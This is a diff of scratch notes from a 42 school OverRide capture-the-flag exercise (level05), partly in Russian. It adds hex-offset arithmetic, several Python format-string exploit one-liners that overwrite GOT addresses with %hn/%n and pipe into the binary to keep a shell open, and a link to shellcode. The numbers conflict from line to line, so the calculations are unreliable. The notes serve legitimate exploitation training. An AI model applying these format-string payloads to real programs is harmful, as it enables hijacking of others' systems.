@@ -105,6 +105,8 @@ env address at 0xffffd86f
 0xffff = 65535
 d86e = 55406
 
+ffff - 65535
+d86f - 55399
 #55406 - 8 = 55398
 #65535 - 55398 = 10129
 
@@ -114,4 +116,21 @@ Shellcode это у нас целочисленное? Почему?
 level05@OverRide:/tmp$ ./a.out SHELLCODE
 env address at 0x7fffffffe8ac
 
-(python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%55267d' + '%10\$hn' + '%10260d' + '%11\$hn'"; cat - ) | ./level05
+(python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%55399d' + '%10\$hn' + '%10136d' + '%11\$hn'"; cat - ) | ./level05
+
+ffff - 65535
+d7ed - 55277 = 55268
+10258
+
+
+(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%54995x " + "%10$n" + "%10531x" + "%11$n"'; cat) | ./level05
+
+0xffff = 65535
+d6dc = 54995
+10531
+
+55127
+10399
+
+http://shell-storm.org/shellcode/files/shellcode-827.php
+https://github.com/G33f/42_Override/blob/master/level05/Ressources/walkthrough.txt
